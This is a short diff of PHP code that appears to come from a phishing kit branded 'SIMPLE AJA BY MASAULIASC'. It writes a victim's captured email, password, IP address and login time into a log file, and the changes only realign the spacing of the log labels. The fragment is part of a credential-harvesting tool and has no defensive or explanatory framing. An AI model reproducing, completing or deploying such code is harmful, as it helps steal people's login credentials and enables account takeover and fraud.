@@ -15,27 +15,27 @@ fwrite($handle, "----------SIMPLE AJA BY MASAULIASC-----------");
 
 fwrite($handle, "\n");
                  
-fwrite($handle, "Email		:");
+fwrite($handle, "Email     :");
 
 fwrite($handle, " $username");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "Password	:");
+fwrite($handle, "Password :");
 
 fwrite($handle, " $password");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "IP			:");
+fwrite($handle, "IP       :");
 
 fwrite($handle, " $ip");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "Masuk		:");
+fwrite($handle, "Masuk    :");
 
-fwrite($handle, "$today");
+fwrite($handle, " $today");
 
 fwrite($handle, "\n");
 
